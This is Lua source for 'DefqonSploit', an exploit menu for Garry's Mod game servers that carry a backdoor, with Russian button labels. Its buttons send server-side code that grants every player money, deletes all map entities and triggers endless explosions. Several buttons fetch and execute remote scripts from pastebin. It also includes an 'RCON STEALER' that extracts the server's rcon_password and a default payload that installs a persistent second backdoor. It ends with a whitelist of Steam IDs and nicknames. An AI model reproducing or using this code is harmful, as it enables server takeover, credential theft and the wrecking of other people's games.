surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx15.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Сломано" )
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:addMoney(99999999999999999) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx16 = vgui.Create("DButton", DScrollPanel)
commandnethtx16:SetSize( 208, 20 )
commandnethtx16:SetPos( 2, 425 )
commandnethtx16:SetText("Порно звуки шагов")
commandnethtx16:SetTextColor(Color(255, 255, 255, 255))
commandnethtx16.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx16.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Ах" )
net.Start(thefrenchenculer)
net.WriteString( "hook.Add(\"PlayerFootstep\", \"porn\", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( \"vo/npc/female01/pain06.wav\",75,math.random( 50, 150 )) end )" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx17 = vgui.Create("DButton", DScrollPanel)
commandnethtx17:SetSize( 208, 20 )
commandnethtx17:SetPos( 2, 450 )
commandnethtx17:SetText("☢ Удалить все энтити ☢")
commandnethtx17:SetTextColor(Color(255, 255, 255, 255))
commandnethtx17.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx17.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Удалено" )
net.Start(thefrenchenculer)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx18 = vgui.Create("DButton", DScrollPanel)
commandnethtx18:SetSize( 208, 20 )
commandnethtx18:SetPos( 2, 475 )
commandnethtx18:SetText("Хуйня ебаная рот ебал")
commandnethtx18:SetTextColor(Color(255, 255, 255, 255))
commandnethtx18.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx18.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "hellstart/hellend" )
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/LH4NW5yc\",RunString)" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx19 = vgui.Create("DButton", DScrollPanel)
commandnethtx19:SetSize( 208, 20 )
commandnethtx19:SetPos( 2, 500 )
commandnethtx19:SetText("-Уши у всех игроков")
commandnethtx19:SetTextColor(Color(255, 255, 255, 255))
commandnethtx19.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx19.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "-уши" )
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx20 = vgui.Create("DButton", DScrollPanel)
commandnethtx20:SetSize( 208, 20 )
commandnethtx20:SetPos( 2, 525 )
commandnethtx20:SetText("Землетрясение")
commandnethtx20:SetTextColor(Color(255, 255, 255, 255))
commandnethtx20.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx20.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx21 = vgui.Create("DButton", DScrollPanel)
commandnethtx21:SetSize( 208, 20 )
commandnethtx21:SetPos( 2, 550 )
commandnethtx21:SetText("2D модели")
commandnethtx21:SetTextColor(Color(255, 255, 255, 255))
commandnethtx21.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx21.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Бах" )
net.Start(thefrenchenculer)
net.WriteString([[
    for k,v in pairs(player.GetAll()) do
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(4,0,4))
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end]])
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx22 = vgui.Create("DButton", DScrollPanel)
commandnethtx22:SetSize( 208, 20 )
commandnethtx22:SetPos( 2, 575 )
commandnethtx22:SetText("Армагеддон")
commandnethtx22:SetTextColor(Color(255, 255, 255, 255))
commandnethtx22.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx22.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
local armageddon = [[
            hook.Add("Think", "armageddon", function()
                local explode = ents.Create( "env_explosion" )
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                    explode:Spawn()
                    explode:SetKeyValue( "iMagnitude", "500" )
                    explode:Fire( "Explode", 0, 0 )
                end)
]]
net.Start(thefrenchenculer)
net.WriteString( armageddon )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx23 = vgui.Create("DButton", DScrollPanel)
commandnethtx23:SetSize( 208, 20 )
commandnethtx23:SetPos( 2, 600 )
commandnethtx23:SetText("Сделать всех гигантами")
commandnethtx23:SetTextColor(Color(255, 255, 255, 255))
commandnethtx23.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx23.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Все стали гигантами" )
local giant = [[
hook.Add("Think", "giant", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(2.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(thefrenchenculer)
net.WriteString( giant )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx24 = vgui.Create("DButton", DScrollPanel)
commandnethtx24:SetSize( 208, 20 )
commandnethtx24:SetPos( 2, 625 )
commandnethtx24:SetText("Сделать всех высокими")
commandnethtx24:SetTextColor(Color(255, 255, 255, 255))
commandnethtx24.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx24.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Все стали высокими" )
local tall = [[
hook.Add("Think", "tall", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(0.2, 80);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(thefrenchenculer)
net.WriteString( tall )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx25 = vgui.Create("DButton", DScrollPanel)
commandnethtx25:SetSize( 208, 20 )
commandnethtx25:SetPos( 2, 650 )
commandnethtx25:SetText("SpeedHack")
commandnethtx25:SetTextColor(Color(255, 255, 255, 255))
commandnethtx25.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx25.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
local speedhack = [[
hook.Add("Think", "speedhack", function()
    for k,v in pairs (player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(thefrenchenculer)
net.WriteString( speedhack )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx26 = vgui.Create("DButton", DScrollPanel)
commandnethtx26:SetSize( 208, 20 )
commandnethtx26:SetPos( 2, 675 )
commandnethtx26:SetText("Кашель всевышнего")
commandnethtx26:SetTextColor(Color(255, 255, 255, 255))
commandnethtx26.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx26.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Кхм" )
net.Start(thefrenchenculer)
net.WriteString([[
for k,v in pairs(player.GetAll()) do
    timer.Create("cough", 10, 0, function()
        RunConsoleCommand("say", "*кхм..кхм*")
        v:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)
        util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 1, 5000 )
    end)
end
]])
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx27 = vgui.Create("DButton", DScrollPanel)
commandnethtx27:SetSize( 208, 20 )
commandnethtx27:SetPos( 2, 700 )
commandnethtx27:SetText("Azis - Hop на весь экран")
commandnethtx27:SetTextColor(Color(255, 255, 255, 255))
commandnethtx27.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx27.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запущено" )
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/re1ucyWy\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx28 = vgui.Create("DButton", DScrollPanel)
commandnethtx28:SetSize( 208, 20 )
commandnethtx28:SetPos( 2, 125 )
commandnethtx28:SetText("RCON STEALER")
commandnethtx28:SetTextColor(Color(255, 255, 255, 255))
commandnethtx28.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
commandnethtx28.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/V054AVp3\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if iZNX.ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText( Color(255, 0, 0),"rcon_password не найден, попробуйте еще раз ^^" )
end
end )
end
----------------------------------------------------------------------------------------------
local RconCommand = vgui.Create( "DTextEntry", DScrollPanel )
RconCommand:SetPos( 110, 0 )
RconCommand:SetSize( 100, 20 )
RconCommand:SetText( "hostname Hacked by DefqonSploit | discord.gg/weJb7TJ" )
local Lancer_rcon_commande = vgui.Create("DButton", DScrollPanel )
Lancer_rcon_commande:SetSize( 103, 20 )
Lancer_rcon_commande:SetPos( 2, 0 )
Lancer_rcon_commande:SetText("RCON Команда")
Lancer_rcon_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_rcon_commande.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
Lancer_rcon_commande.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Rcon Команда отправлена" )
local rcon_commandes_get = RconCommand:GetValue()
iZNX.NetStart(thefrenchenculer)
net.WriteString( rcon_commandes_get )
net.WriteBit(false)
net.SendToServer()
end
local GLUACommand = vgui.Create( "DTextEntry", DScrollPanel )
GLUACommand:SetPos( 110, 25 )
GLUACommand:SetSize( 100, 20 )
GLUACommand:SetText( "util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)" ) -- timer.Create(\"Timerdecrash\",0.5,1,function() while true do end end)
local Lancer_glua_commande = vgui.Create("DButton", DScrollPanel )
Lancer_glua_commande:SetSize( 103, 20 )
Lancer_glua_commande:SetPos( 2, 25 )
Lancer_glua_commande:SetText("Lua код")
Lancer_glua_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_glua_commande.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 0, 0 ,155)
surface.DrawRect(0, 0, w, h)
end
Lancer_glua_commande.DoClick = function()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Lua код отправлен" )
local glua_commandes_get = GLUACommand:GetValue()
iZNX.NetStart(thefrenchenculer)
net.WriteString( glua_commandes_get )
net.WriteBit(1)
net.SendToServer()
end
end
net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
chat.AddText( Color(255, 255, 255), rcon_pass, Color(0, 255, 0)," GG с этим вы можете ломать сервер, даже если он удалит backdoor :D")
end )
net.Receive( "aucun_rcon_ici", function()
chat.AddText( Color(255, 0, 0),"Нет rcon_password на сервере :/" )
end )
function iZNX.MakePlayerSelectionButton( parent, x, y, addr )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( "Выберите игрока" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 90, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(70, 70, 100, 255) )
surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.SelectPlayersPanel( addr )
end
return TButton:GetWide(), TButton:GetTall()
end
function iZNX.SelectPlayersPanel( addr )
if iZNX.PlayerSelector and iZNX.PlayerSelector:IsVisible() then iZNX.PlayerSelector:Remove() end
local plytab = iZNX.GetStored( addr, {} )
iZNX.PlayerSelector = vgui.Create("DFrame")
iZNX.PlayerSelector:SetSize(250,400)
iZNX.PlayerSelector:SetTitle("Выбор цели")
iZNX.PlayerSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.PlayerSelector:MakePopup()
iZNX.PlayerSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local Plist = vgui.Create( "DPanelList", iZNX.PlayerSelector )
Plist:SetSize( iZNX.PlayerSelector:GetWide() - 10, iZNX.PlayerSelector:GetTall() - 55 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 5, 40 )
Plist:SetName( "" )
local target1 = vgui.Create("DButton", iZNX.PlayerSelector)
target1:SetSize( 40, 20 )
target1:SetPos( 10, 23 )
target1:SetText("Все")
target1:SetTextColor(Color(255, 255, 255, 255))
target1.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target1.DoClick = function()
for _, p in pairs(player.GetAll()) do
if not table.HasValue( plytab, p ) then
table.insert( plytab, p )
end
end
iZNX.Store( addr, plytab )
end
local target2 = vgui.Create("DButton", iZNX.PlayerSelector)
target2:SetSize( 40, 20 )
target2:SetPos( 55, 23 )
target2:SetText("Никто")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target2.DoClick = function()
table.Empty( plytab )
iZNX.Store( addr, plytab )
end
local target3 = vgui.Create("DButton", iZNX.PlayerSelector )
target3:SetSize( 40, 20 )
target3:SetPos( 100, 23 )
target3:SetText("Вы")
target3:SetTextColor(Color(255, 255, 255, 255))
target3.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 50 ,155)
surface.DrawRect(0, 0, w, h)
end
target3.DoClick = function()
table.Empty( plytab )
table.insert( plytab, LocalPlayer() )
iZNX.Store( addr, plytab )
end
local target4 = vgui.Create( "DTextEntry", iZNX.PlayerSelector )
target4:SetPos( 145, 23 )
target4:SetSize( 95, 20 )
target4:SetText( "" )
target4.OnChange = function( self )
local nam = self:GetValue()
local namtab = string.Explode( ", ", nam )
table.Empty( plytab )
for _, pl in pairs( player.GetAll() ) do
for _, s in pairs( namtab ) do
if string.find( string.lower( pl:Nick() ), s ) then
table.insert( plytab, pl )
end
end
end
iZNX.Store( addr, plytab )
end
for k, v in pairs( player.GetAll() ) do
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 200, 25 )
local teamcol = team.GetColor( v:Team() )
plypanel2.Paint = function( s, w, h )
if !v:IsValid() then return end
surface.SetDrawColor( Color(30, 30, 30, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( teamcol )
surface.DrawRect( 0, h - 3, w, 3 )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
if table.HasValue( plytab, v ) then surface.SetDrawColor( Color(55, 255, 55, 245) ) end
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 10, 5 )
plyname:SetFont( "Trebuchet18" )
local tcol = Color( 255, 255, 255 )
if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
plyname:SetColor( tcol )
plyname:SetText( v:Nick() )
plyname:SetSize(180, 15)
local faggot = vgui.Create("DButton", plypanel2 )
faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
faggot:SetPos( 0, 0 )
faggot:SetText("")
faggot.Paint = function(panel, w, h)
return
end
faggot.DoClick = function()
if table.HasValue( plytab, v ) then
table.RemoveByValue( plytab, v )
else
table.insert( plytab, v )
end
iZNX.Store( addr, plytab )
end
Plist:AddItem( plypanel2 )
end
end
function iZNX.MakeTextInputButton( parent, x, y, btext, default, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local tentry = vgui.Create( "DTextEntry", hostframe )
tentry:SetPos( 10 + tttt:GetWide(), 2 )
tentry:SetSize( 130, 20 )
tentry:SetText( iZNX.GetStored( addr, default ) )
tentry.OnChange = function( self )
iZNX.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
function iZNX.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local wangmeoff = vgui.Create( "DNumberWang", hostframe )
wangmeoff:SetPos( 10 + tttt:GetWide(), 2 )
wangmeoff:SetSize( 75, 20 )
wangmeoff:SetDecimals( 2 )
wangmeoff:SetMinMax( min , max )
wangmeoff:SetValue( iZNX.GetStored( addr, default ) )
wangmeoff:SetAllowNonAsciiCharacters(false)
wangmeoff.OnValueChanged = function( self, val )
iZNX.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
local FillFrameRates = RatesScaleLevel
concommand.Add( "Defqon", function()
if FillFrameRates == "STEAM_0:0:0" -- Одиночная игра (на всякий случай)
or FillFrameRates == "STEAM_0:0:133570476" -- Dark Louder
or FillFrameRates == "STEAM_0:0:179576807" -- Leith
or FillFrameRates == "STEAM_0:1:163307812"
or FillFrameRates == "STEAM_0:1:86857163"
or FillFrameRates == "STEAM_0:1:148600355" -- faulif
or FillFrameRates == "STEAM_0:0:141778910" -- Саня кодер
or FillFrameRates == "STEAM_0:1:164342539" -- QuaceZero
or FillFrameRates == "STEAM_0:1:417868808" -- QuaceZero
or FillFrameRates == "STEAM_0:0:209305097" -- QuaceZero
or FillFrameRates == "STEAM_0:1:426772203" -- QuaceZeroZ
or FillFrameRates == "STEAM_0:1:87232089" -- lizardcsgo a.k.a lzrdblzzrd
or FillFrameRates == "STEAM_0:0:122023682" -- Travka
or FillFrameRates == "STEAM_0:0:95724304" -- QURS
or FillFrameRates == "STEAM_0:1:223956472" -- Ermack
or FillFrameRates == "STEAM_0:0:188571603" -- Ermack
or FillFrameRates == "STEAM_1:0:169694836" -- KIR
or FillFrameRates == "STEAM_0:0:169694836" -- KIR
or FillFrameRates == "STEAM_1:1:169694836" -- KIR
or FillFrameRates == "STEAM_0:1:169694836" -- KIR
or FillFrameRates == "STEAM_1:1:123190008" -- KIR
or FillFrameRates == "STEAM_0:1:123190008" -- KIR
or FillFrameRates == "STEAM_1:0:123190008" -- KIR
or FillFrameRates == "STEAM_0:0:123190008" -- KIR
or FillFrameRates == "STEAM_0:0:91988659" -- Kocmonavtik
or FillFrameRates == "STEAM_0:1:172637672" -- Megumin
or FillFrameRates == "STEAM_0:0:78124882" -- Лена
or FillFrameRates == "STEAM_0:1:184001693" -- я
or FillFrameRates == "STEAM_1:1:84267153" -- JohnBard
or FillFrameRates == "STEAM_0:1:84267153" -- JohnBard
or FillFrameRates == "STEAM_0:0:84267153" -- JohnBard
or FillFrameRates == "STEAM_0:0:68849843" -- Hason
or FillFrameRates == "STEAM_1:0:68849843" -- Hason
or FillFrameRates == "STEAM_0:1:68849843" -- Hason
or FillFrameRates == "STEAM_0:1:68104527" -- Wsank
or FillFrameRates == "STEAM_0:0:48628674" -- one touch gamer
or FillFrameRates == "STEAM_0:0:67003290" -- one touch gamer
or FillFrameRates == "STEAM_0:0:38886601" -- Moon
or FillFrameRates == "STEAM_0:1:51961104" -- Lil Peep
or FillFrameRates == "STEAM_0:0:134073192" -- Tόshâ Bόbürϊn
or FillFrameRates == "STEAM_0:1:160705047" -- n1ce
or FillFrameRates == "STEAM_0:1:185806144" -- Gabe
or FillFrameRates == "STEAM_0:1:83285008" -- Gabe
or FillFrameRates == "STEAM_0:0:425100967" -- Suip
or FillFrameRates == "STEAM_0:1:128267449" -- valve
or FillFrameRates == "STEAM_0:1:80063374"  -- valve
or FillFrameRates == "STEAM_0:0:98978109" -- Rope
or FillFrameRates == "STEAM_1:1:82067910" -- EduCool
or FillFrameRates == "STEAM_1:0:82067910" -- EduCool
or FillFrameRates == "STEAM_0:1:82067910" -- EduCool
or FillFrameRates == "STEAM_0:0:64321681" -- Vermin (за помощь в расследовании)
or FillFrameRates == "STEAM_0:1:96464196"  -- sadless
or FillFrameRates == "STEAM_0:1:59441932"  -- PanDemiuKcin
or FillFrameRates == "STEAM_0:0:148433957" -- aloha
or FillFrameRates == "STEAM_0:1:117441810" -- Saibot
or FillFrameRates == "STEAM_0:0:64403782"  -- Максим
or FillFrameRates == "STEAM_0:1:162799229" -- Totito
or FillFrameRates == "STEAM_0:0:107060867" -- Mircus
or FillFrameRates == "STEAM_0:0:91077309"  -- FoXy
or FillFrameRates == "STEAM_0:1:126480121" -- Mafick
or FillFrameRates == "STEAM_0:1:109987888" -- Goveniy
or FillFrameRates == "STEAM_0:1:195298319" -- ЕгорБандит
or FillFrameRates == "STEAM_0:1:60081728"  -- LiGyH
or FillFrameRates == "STEAM_0:1:40648546"  -- LousyFox
or FillFrameRates == "STEAM_1:1:420868808" -- HELSTAFF
or FillFrameRates == "STEAM_0:1:420868808" -- HELSTAFF
or FillFrameRates == "STEAM_1:0:420868808" -- HELSTAFF
or FillFrameRates == "STEAM_0:0:420868808" -- HELSTAFF
or FillFrameRates == "STEAM_0:0:156912424" -- Ruby
or FillFrameRates == "STEAM_0:1:147609270" -- Niceman
or FillFrameRates == "STEAM_0:1:106930709" -- Niceman
